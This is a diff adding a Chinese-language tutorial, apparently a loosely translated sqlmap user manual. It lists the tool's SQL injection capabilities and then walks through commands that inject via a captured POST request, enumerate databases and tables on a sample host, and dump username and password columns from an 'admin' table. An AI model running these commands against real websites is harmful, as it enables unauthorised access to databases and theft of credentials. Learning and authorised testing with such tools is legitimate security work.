@@ -1,0 +1,42 @@
+Sqlmap是十分著名的、自动化的SQL注入工具。为了较为系统地学习Sqlmap，我决定翻译一遍Sqlmap的用户手册，于是便有了此文。由于我英语学得很差，所以翻译地不好。基本上是意译，还加入了我自己的东西，和原文有较大差距。
+
+Sqlmap是开源的自动化SQL注入工具，由Python写成，具有如下特点：
+
+完全支持MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、HSQLDB和Informix等多种数据库管理系统。
+完全支持布尔型盲注、时间型盲注、基于错误信息的注入、联合查询注入和堆查询注入。
+在数据库证书、IP地址、端口和数据库名等条件允许的情况下支持不通过SQL注入点而直接连接数据库。
+支持枚举用户、密码、哈希、权限、角色、数据库、数据表和列。
+支持自动识别密码哈希格式并通过字典破解密码哈希。
+支持完全地下载某个数据库中的某个表，也可以只下载某个表中的某几列，甚至只下载某一列中的部分数据，这完全取决于用户的选择。
+支持在数据库管理系统中搜索指定的数据库名、表名或列名
+当数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时支持下载或上传文件。
+当数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时支持执行任意命令并回现标准输出。
+
+
+
+
+
+从post数据包中注入
+可以使用burpsuite或者temperdata等工具来抓取post包
+
+sqlmap -r "c:\tools\request.txt" -p "username" --dbms mysql    指定username参数
+
+注入成功后
+获取数据库基本信息
+sqlmap -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql --level 3 --dbs
+
+查询有哪些数据库
+
+sqlmap -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql --level 3 -D test --tables
+
+查询test数据库中有哪些表
+
+sqlmap -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql --level 3 -D test -T admin --columns
+
+查询test数据库中admin表有哪些字段
+
+sqlmap -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql --level 3 -D test -T admin -C "username,password" --dump
+
+dump出字段username与password中的数据
+
+其他命令参考下面
